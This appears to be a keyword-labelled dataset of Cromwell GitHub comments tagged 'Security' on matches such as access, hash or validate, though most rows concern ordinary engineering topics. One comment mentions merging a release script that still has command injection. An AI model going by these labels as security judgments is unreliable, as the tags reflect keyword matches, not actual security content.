akka.dispatch.TaskInvocation.run(AbstractDis",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651:348,access,access,348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437251651,2,['access'],['access']
Security,@mbookman our backlog has been moved to Jira. Here is the link to this [ticket](https://broadworkbench.atlassian.net/browse/BA-2168) ; You will need to create an account to access this ticket. I defer to @ruchim for priority of this feature.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499987555:173,access,access,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-499987555,1,['access'],['access']
Security,"@mcovarr ; Is the bucket http://s3.amazonaws.com/cromwell-centaur-execution/ public? Because when I tried to open it, I've got `AccessDenied`. ; As far as I know, centaur do not share credentials with cromwell (at least if credentials were provided in `.conf` file, idk what about default auth mechanism), and therefore this exception may be caused by lack of credentials on centaur side.; Actually, in this PR a support for aws auth was added to centaur, so can you please try to run this test with aws credentials in `centaur/src/main/resources/reference.conf`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-544924499:128,Access,AccessDenied,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5110#issuecomment-544924499,1,['Access'],['AccessDenied']
Security,"@mcovarr @cjllanwarne I made substantial changes to allow for automatic release number calculation and added the few things we talked about (pin centaur branch, add hotfix branch). It still has command injection though...; I tested it on a fork and as far as I can tell everything looked good.; If you don't mind re-giving it a look, otherwise I'll probably merge it as is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-287431325:202,inject,injection,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2065#issuecomment-287431325,1,['inject'],['injection']
Security,"@mcovarr @ruchim I confirmed that this is fine. The underlying PAPI job will fail as expected (since it does not have rights to access BQ) but nothing blows up in a weird way. . Steps:. 1. Make a minimally permissioned SA and try running. This succeeds as the default compute service account has editor access. However, nothing blew up when setting the BQ scope. Sorta success.; 2. Use that minimally permissioned SA as the `google_compute_service_account` - the PAPI job fails as expected, but nothing else untoward happened. Great success.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5023#issuecomment-503668465:128,access,access,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5023#issuecomment-503668465,2,['access'],['access']
Security,"@mcovarr I believe all issues are addressed. I'll let you cherry-pick / merge / squash or even reject this PR at your will. Pre-tech talk with @geoffjentry (including a TLA extravaganza!):. **TL;DR The database/slick is for CRUD, not for the T in ETL.**. IMHO, the database code started to evolve well beyond CRUD. Very often in slick specific code, one saw multiple lines of code like: ""before inserting rows in slick, quickly (E)xtract some other rows, (T)ransform them into core objects, filter, re-transform them into new core objects, then (L)oad the new objects into slick."" That ETL embedded in slick could never be used DRY-ly, and to me smelled as violating separation of concerns. With the current SoC, the slick code is _mostly_ concerned with marshaling data to and from the database via slick. If I wanted to, I could very trivially create a different layer that marshaled data using hibernate, a thin layer of prepared statements, mocks, etc., _without_ duplicating a lot of the ETL code. Another way of visualizing the issue: Below is the current project dependency diagram. The services need to access data from the database. Currently that's implemented as the services depend on engine that depends on the database. The database used to have a similar same circular dependency. Gun-shy of folks (including myself) re-introducing a similar dependency loop, I've kept core as far away as possible from the database/slick, because the slick specific code _should not_ need core for basic CRUD. As for the rest of the system, I see core as a base of objects for backends and the engine to communicate. ![cromwell project dependency diagram](https://cloud.githubusercontent.com/assets/791985/15779136/92db94a6-2968-11e6-90f8-c0b40d162a56.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591:1111,access,access,1111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/935#issuecomment-223577591,1,['access'],['access']
Security,"@mcovarr I don't *think* so but as I mentioned earlier I wasn't completely buying what jprofiler was selling and need to take a closer look. Also our comparisons shouldn't be hash code based anyways. One thing I did turn up was elsewhere in that file you had been converting some sets to lists to avoid hashes coming out of filters and such, that might be a thing here as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109:175,hash,hash,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109,2,['hash'],"['hash', 'hashes']"
Security,"@mcovarr It's more concise but it makes several implicit assumptions to fit exactly our 2 current JES use cases (GotC and FireCloud).; IMO it should be flexible enough so that GotC and Firecloud are just combinations of configuration entries among all the possible ones. > // The JES backend is assumed to use the GCS filesystem with user authentication, dropping back to Cromwell; > // authentication if user authentication is not defined. In GotC there is no user authentication, so; > // Cromwell authentication it is. This is tailor made to accommodate GotC and FireCloud with as few configuration changes as possible, but I think we should move towards something more generic, even if the confs look a bit more different between the two.; For example what if you want to use refresh token auth mode for creating the pipeline as well ?; Or refresh token only for pipeline and service account for gcs ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203453031:339,authenticat,authentication,339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203453031,5,['authenticat'],['authentication']
Security,"@mcovarr Yeah the reason for this PR is that there is currently a mutable `var` that holds the process when it's created, so it can be accessed by the abort method. I know `var`s are evil but in this case creating an underlying FSM just to get rid of this `var` does seem an overkill to me. I couldn't find a way to use the `BackendJobExecutionActor` itself to encapsulate this mutable state though, which is why I ended up with this. I can give it another shot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391:135,access,accessed,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391,1,['access'],['accessed']
Security,@mcovarr any chance of getting it re-released as 28.1 or 29? Unfortunately users will just get a checksum mismatch error if the jar is already in their cache since cromwell is `bottle :unneeded`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288:97,checksum,checksum,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288,1,['checksum'],['checksum']
Security,@mcovarr is there any input validation now? Or are malformed inputs still poorly handled?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-326409216:28,validat,validation,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-326409216,1,['validat'],['validation']
Security,@mcovarr right - anything in here gets picked up by the `WomtoolValidateSpec` and run through `womtool validate`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4384#issuecomment-438426231:103,validat,validate,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4384#issuecomment-438426231,1,['validat'],['validate']
Security,"@mcovarr that's true, I think it would fail eventually anyway whenever something tries to access those files (or not if nothing does ?) ? And I thought that one of the assumption in this ""no-copy"" mode is that we expect the files to be relatively immutable anyway. . But I also agree that it would be cleaner to fail the ""caching"" if they don't exist rather than the downstream task failing by itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2347#issuecomment-307422116:90,access,access,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2347#issuecomment-307422116,1,['access'],['access']
Security,"@mcovarr: ""It's the deep hashCode computation to determine map buckets that's the problem."" how did you determine this? jprofiler?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277882112:25,hash,hashCode,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277882112,1,['hash'],['hashCode']
Security,"@mcovarr: ; > how do these changes enable WDL 1.0 support. It replaces the use of WDL draft 2 objects to build a graph with the use of WOM objects to build the graph. > or the tests confirm that support has been added?. The tests make sure that the examples in the `womtool validate` test suite (which includes WDL draft-2 and 1.0) also run to completion in `womtool graph`. It doesn't assert that the output is _correct_ per se, but it does check that the process exits with a non-failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5326#issuecomment-567208623:274,validat,validate,274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5326#issuecomment-567208623,1,['validat'],['validate']
Security,"@meganshand Was this resolved by using the file-path hashing method? If so, can I close this ticket?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272244992:53,hash,hashing,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1826#issuecomment-272244992,1,['hash'],['hashing']
Security,@nvanaja I re-verified your permissions and they look right. I am noticing that Git is using `https://github.com/broadinstitute/cromwell.git/'` as the remote; using an HTTPS remote does not use your SSH keys for authentication and could be causing the problem. I always recommend SSH remotes e.g. `git@github.com:broadinstitute/cromwell.git`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760536657:212,authenticat,authentication,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760536657,1,['authenticat'],['authentication']
Security,"@orodeh yeah, I wouldn't worry about that (it sounds like a hash was changed in quay.io for the first time in 2 years and it broke that test. Nothing for us to worry about in this PR!). I'll wait for the tests to complete again and as long as it's still looking good, I'll merge",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370594386:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3354#issuecomment-370594386,1,['hash'],['hash']
Security,"@pgrosu It's in our internal space, however I can give you the gist. We're doing a few things at once ...; - Make workflow submission async. Submitted workflows go into a new store and the WorkflowManagerActor can pull them as necessary. Within the store they'll be marked as either Submitted, Running or Restartable. The latter is a state which is assigned to any workflow in Running state when the system comes online; - The EngineJobExecutionActor (EJEA above) sits between the WorkflowExecutionActor and the BackendJobExecutionActor, and will manage engine-side knowledge in a persisted store. The combination of this and the above will allow us to bring back what we call the 'restart' functionality - i.e. pick up a running workflow from the engine side but not reattach to running backend jobs; - Less hashed out at the moment, if a backend will support 'recover' functionality (attaching to the backend jobs, we'll implement this in as many of our own backends as we can), the backend will need to manage its own information, e.g. using the KV store",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714:809,hash,hashed,809,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714,1,['hash'],['hashed']
Security,"@prihoda . miniwdl has a [little CLI wrapper](https://github.com/chanzuckerberg/miniwdl#miniwdl-cromwell) to make it nicer to launch cromwell locally. It doesn't do the the shebang script which is a neat idea, however, it does implement versions of (i) parsing the task/workflow inputs to expose them as command-line arguments, and (ii) parsing the outputs to organize them more nicely after they come out. [Here is a link](https://github.com/chanzuckerberg/miniwdl/blob/b7f399b56ad2f01ed9867e6105c036a251c4ae73/WDL/CLI.py#L289) to the CLI entrypoint for this where you can see how all this happens. I'd be happy to work with you on merging & fleshing out the ideas.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5029#issuecomment-501874278:289,expose,expose,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5029#issuecomment-501874278,1,['expose'],['expose']
Security,"@rhpvorderman great comment, I don't think there's an especially nice workaround to this right now. This is caused because `defined` operates on optional values (eg `File?`) whereas object member accesses either returns a value, or fail the workflow. We could fix this in a couple of ways:. - Change member access to always return optional values. This would have the side effect of forcing subsequent usages to handle the optional result even if you know the object has that key.; - Add a `hasKey(object, key)` method for objects, roughly equivalent to how you're trying to use `defined`. ; - Maybe adding a `getPath(object, path)` method that returns an optional value which is set if the path exists in the object, or empty if it isn't. And with my apologies, I'm now going to immediately redirect you elsewhere... Since any of the above suggestions would require a change to the [WDL spec](https://github.com/openwdl/wdl), I suggest you open this as a new issue in that repo. Once the change is accepted there I'll be able to make a new issue here to implement the change in Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3093#issuecomment-359959967:196,access,accesses,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3093#issuecomment-359959967,2,['access'],"['access', 'accesses']"
Security,"@ruchim @cjllanwarne that's correct. We deserialize the response from Martha into [these](https://github.com/broadinstitute/cromwell/blob/26c5bbf007f81ab9604109ce46063b85e3ac0586/cloud-nio/cloud-nio-impl-drs/src/main/scala/cloud/nio/impl/drs/DrsPathResolver.scala#L81-L90) case classes. Currently, even though Martha accepts `drs://` uuids, the response we get back from Martha contains a key called `dos: {...}` within which lies our gs urls, size, checksum, etc. Hence the object can still be called `DosObject`. For example if you curl to Martha with a uuid `drs://path-here` it would respond back with a response os structure to ; ```; {; ""dos"": {; ""data_object"": {; ""id"": ""...."",; ""urls"": [; {; ""url"": ""https://url""; },; {; ""url"": ""gs://url""; }; ],; ""size"": ""123"",; ""checksums"": [; {; ""checksum"": ""123"",; ""type"": ""sha256""; }; ],; ""aliases"": [; ""some-alieas""; ],; ""version"": ""2019-07-04T104122.106166Z"",; ""name"": ""name-of-file""; }; },; ""googleServiceAccount"": {; ......; }; }; ```; where the metadata information lies in `dos` key.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5149#issuecomment-526649237:450,checksum,checksum,450,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5149#issuecomment-526649237,3,['checksum'],"['checksum', 'checksums']"
Security,"@ruchim Thanks for the update. I can find a workaround, e.g. reducing the number of exposed outputs; it's just that this will affect others using the same workflow on e.g. DNAnexus . If I try to make a PR myself, based on what's done for AWS_CROMWELL_INPUTS_GZ, do you think you'd be able to look at it?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-445982069:84,expose,exposed,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-445982069,1,['expose'],['exposed']
Security,"@ruchim turned on file hash caching, which solved the problem for us.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873#issuecomment-486795661:23,hash,hash,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873#issuecomment-486795661,1,['hash'],['hash']
Security,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:1082,validat,validateWorkflowIdInMetadata,1082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053,1,['validat'],['validateWorkflowIdInMetadata']
Security,"@samanehsan there is a problem here (maps that are made using `String`s and `Int`s should evaluate to `Map[X, String]` rather than `Map[X, Int]`, but in your case the real problem is you're using `Map`s to instantiate `Object`s - which is much nicer to do using the object literal syntax. In your example:. ```wdl; other_inputs = [; object {; name: ""sample_id"",; value: GetInputs.sample_id; },; object {; name: ""reference_name"",; value: reference_name; },; object {; name: ""transcriptome_tar_gz"",; value: transcriptome_tar_gz; },; object {; name: ""expect_cells"",; value: expect_cells; }; ]; ```. This has the added bonus when you switch to WDL 1.0 and start using `struct`s that we can type-check that your object instantiations have the correct set of fields at validation time (we can't do that with map => object coercions)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4131#issuecomment-427505754:763,validat,validation,763,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4131#issuecomment-427505754,1,['validat'],['validation']
Security,"@scottfrazer @francares @geoffjentry @kcibul . The choice of Develop was deliberate. If we review these changes vs master we'll only give ourselves a false sense of security w.r.t the real state of the merge. As I said before, I'm most worried about the divergence between our two branches, not just the implementation diff between this branch and Master. Personally I would address any existing comments and close this version of the PR. But whichever way we go, I recommend against leaving 2 PRs open for the same change at the same time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174210135:165,secur,security,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174210135,1,['secur'],['security']
Security,@scottfrazer See: ; def getExecutionsWithResuableResultsByHash(hash: String): Future[Traversable[Execution]],MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/278#issuecomment-155148633:63,hash,hash,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/278#issuecomment-155148633,1,['hash'],['hash']
Security,"@seandavi ; I SSH'd into the compute environment and was able to copy files into the cromwell executions bucket. Though something weird seems to be going on with the authentication because the instance appears to have write permissions for all the s3 buckets in the region, which appears to be due to the AmazonEC2RoleforSSM policy attached to the instance IAM:. ```; {; ""Version"": ""2012-10-17"",; ""Statement"": [; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssm:DescribeAssociation"",; ""ssm:GetDeployablePatchSnapshotForInstance"",; ""ssm:GetDocument"",; ""ssm:GetManifest"",; ""ssm:GetParameters"",; ""ssm:ListAssociations"",; ""ssm:ListInstanceAssociations"",; ""ssm:PutInventory"",; ""ssm:PutComplianceItems"",; ""ssm:PutConfigurePackageResult"",; ""ssm:UpdateAssociationStatus"",; ""ssm:UpdateInstanceAssociationStatus"",; ""ssm:UpdateInstanceInformation""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ssmmessages:CreateControlChannel"",; ""ssmmessages:CreateDataChannel"",; ""ssmmessages:OpenControlChannel"",; ""ssmmessages:OpenDataChannel""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2messages:AcknowledgeMessage"",; ""ec2messages:DeleteMessage"",; ""ec2messages:FailMessage"",; ""ec2messages:GetEndpoint"",; ""ec2messages:GetMessages"",; ""ec2messages:SendReply""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""cloudwatch:PutMetricData""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ec2:DescribeInstanceStatus""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""ds:CreateComputer"",; ""ds:DescribeDirectories""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""logs:CreateLogGroup"",; ""logs:CreateLogStream"",; ""logs:DescribeLogGroups"",; ""logs:DescribeLogStreams"",; ""logs:PutLogEvents""; ],; ""Resource"": ""*""; },; {; ""Effect"": ""Allow"",; ""Action"": [; ""s3:GetBucketLocation"",; ""s3:PutObject"",; ""s3:GetObject"",; ""s3:GetEncryptionConfiguration"",; ""s3:AbortMultipartUpload"",; ""s3:ListMultipartUploadParts"",; ""s3:ListBucket"",; ""s3:ListBucketMultipartUploads""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292:166,authenticat,authentication,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435109292,1,['authenticat'],['authentication']
Security,"@sfrazet on all of your comments revolving around the references to a validation change, early on @mcovarr asked me to clean something up which appeared to be small. It turned out to be neither small nor did it play well with the call caching branch in terms of rebasing. Instead what I'm doing is taking those changes as a separate branch off if the call caching work with the intention of merging it immediately after CC is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/323#issuecomment-164773421:70,validat,validation,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/323#issuecomment-164773421,1,['validat'],['validation']
Security,"@tlangs I think the best answer may be to change the [directoryResolver](https://github.com/broadinstitute/cromwell/blob/develop/languageFactories/language-factory-core/src/main/scala/cromwell/languages/util/ImportResolver.scala#L33) to allow us to customize the ""don't escape the directory"" validation when womtool calls it only, ie:; ```scala; def directoryResolver(directory: Path, allowEscapingDirectory: Boolean = false) = { ; ...; if (absolutePathToFile.startsWith(absolutePathToImports) || allowEscapingDirectory) {; ...; } else {; ...; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401428709:292,validat,validation,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3832#issuecomment-401428709,1,['validat'],['validation']
Security,"@tmdefreitas I observed/experienced a similar issue. I had a WDL with an optional input. It was optional because its type was ""File?"". I was passing in the input when issuing a submission on FireCloud which is currently using v0.24 of Cromwell according to the launch config dialog box. Using the developer tab I saw the error . ```; ""failures"": [{; ""message"": ""Couldn't resolve all inputs for CallingGroup_Workflow.CallSomaticMutations_131_Prepare_Task at index None.: Input evaluation for Call CallingGroup_Workflow.CallSomaticMutations_131_Prepare_Task failed.:\n\tnormalPanelSize:\n\tFile not found fc-2edc2716-272a-438a-b458-25dbee1e253d/eb1f9669-ce6c-462d-950d-630b321ddc1f/CallingGroup_Workflow/096768d6-9e90-4d1d-81c7-f909559a1a55/call-CallSomaticMutations_131_Prepare_Task/\""gs:/firecloud-tcga-open-access/tutorial/reference/refseq_exome_10bp_hg19_300_1kg_normal_panel.vcf\""""; }],; ```. I note two things. First, I note as I mentioned that I was passing in the file and so the error ""File Not found"" does not make sense. Second, I note that the gsURL has only one ""/"" after the ""gs"" ; in contrast the file IS where it is and in the workspace attribute (where it is pulled from) it is there and the file preview worked. Also the gsURL in the workspace had two ""//"" as it should. To be able to successfully use the WDL I removed the ""?"" so that it's a plain ""non-optional"" input. After removing the ""?"" I was able to successfully run the WDL.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1937#issuecomment-276756241:808,access,access,808,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1937#issuecomment-276756241,1,['access'],['access']
Security,"@vdauwera I spotted the issue but it was @kshakir who ended up resolving it. I believe this had to do with the auth that was used to perform the read_* function, and not having access to the proper google credentials. I checked the [config](https://github.com/googlegenomics/pipelines-api-examples/blob/master/wdl_runner/cromwell_launcher/jes_template.conf) wdl_runner uses and I believe it's missing the goolge.auths key and the engine.filesystem.gcs.auth key in the config, which is probably what Cromwell requires to parse gcs files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165:177,access,access,177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165,1,['access'],['access']
Security,"@vdauwera is this a use case for #2652, add a validation endpoint?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332205964:46,validat,validation,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2163#issuecomment-332205964,1,['validat'],['validation']
Security,"@vsoch Thanks for testing this! This was indeed a major oversight on my behalf. . I did some further testing:. + It does not matter if you use a hashed container. Singularity will still look it up on the internet.; + The singularity cache does not store the file in an easily retrievable way:. ```; ~/.singularity/cache/oci-tmp/7c7e798af52365c2fa3c1c4606dcf8c1e2d5e502f49f1185d774655648175308$ ls; fastqc_0.11.9--0.sif fastqc@sha256_319b8d4eca0fc0367d192941f221f7fcd29a6b96996c63cbf8931dbb66e53348.sif; ```; You would have to hack with find etc. Dammit, this means this solution only works for fully connected nodes. And it means an alternate (more robust) solution needs to be hacked together in bash :scream: . On the other hand, I feel this could be fixed easily by singularity having a `--use-cache-first` flag, so it checks the cache first instead of checking the internet. I will investigate what is possible upstream.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498:145,hash,hashed,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498,1,['hash'],['hashed']
Security,"@vsoch That's a fair point. I was thinking that as there were viable config blocks in the new documentation that perhaps it's not necessarily, but I think we want **something** in `cromwell.examples.conf`. Thinking about it a little bit tho it winds up coming back to an issue I kept punting where I didn't want to add a bunch of variants for the different common situations. . Would it make sense to you if there was a comment block in there pointing people to the tutorial for examples? If so I'm happy to do that. If you think it's best to leave the concrete example(s), could you please confirm that they're consistent with the config files you all hashed out in #4635?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468830676:653,hash,hashed,653,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468830676,1,['hash'],['hashed']
Security,"@wholtz unfortunately, I no longer work a the Broad Institute and cannot help you gain access to the cromwell Jira project. @aednichols should be able to help or connect you with someone who can.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097067077:87,access,access,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097067077,1,['access'],['access']
Security,"@wleepang @markjschreiber . I also ran into this issue on several workflows that each ran for 28 hours before failing. Similar to XLuyu, it was in a scattered task. I can't access the logs for the server which failed because Batch terminated it. I suspect that something happened while provisioning the server... through the UserData: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Under that assumption, the fetch_and_run script would have never been installed to the correct location, but the job continued to execute. I see that in some places, you have checks for things such as when the awscli fails to install, then the machine is shutdown. https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/gwfcore/gwfcore-launch-template.template.yaml#L127. Perhaps there should be a validation step to ensure that the machine is correctly provisioned? Alternatively, is it possible to `set -e` directly in the UserData runcmd? I see that `set -e` is set within some scripts, such as `provision.sh`: https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/ecs-additions/provision.sh#L3. Another thought... I see that in the UserData script, there are some calls out to the network. Would it make sense to set AWS_RETRY_MODE=adaptive in such cases to help protect against random network failures?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341:173,access,access,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5872#issuecomment-730119341,2,"['access', 'validat']","['access', 'validation']"
Security,"@yfarjoun @meganshand If I point you to a cromwell branch that might fix this problem, is this something you could easily test ?; I did some testing on my own and it's definitely better but hard to tell if it would really solve this without actually testing it for real.; If the answer is ""you can run this WDL yourself and check"" that's also fine. Just need to have access to all the inputs (and figure out how to get permission to run something on SGE..)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288849829:367,access,access,367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-288849829,1,['access'],['access']
Security,@ysp0606 FYI we've had to disable our Alibaba tests for Cromwell while we wait for our OSS access to be restored. More info in https://broadworkbench.atlassian.net/browse/BA-6345. On our last update we gave Alibaba support a temporary access key from our account so they can try and debug the error code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5467#issuecomment-606119666:91,access,access,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5467#issuecomment-606119666,2,['access'],['access']
